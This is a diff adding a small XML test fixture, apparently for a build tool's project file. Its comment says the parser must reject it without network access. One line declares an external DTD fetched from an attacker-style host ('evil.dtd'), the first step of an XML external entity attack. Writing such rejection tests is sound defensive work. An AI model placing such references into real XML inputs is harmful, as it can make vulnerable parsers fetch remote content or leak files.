@@ -1,0 +1,4 @@
+<?xml version="1.0"?>
+<!-- TEST FIXTURE: external DTD reference. Must be rejected without any network access. -->
+<!DOCTYPE project SYSTEM "http://192.0.2.10/evil.dtd">
+<project><artifactId>demo</artifactId></project>
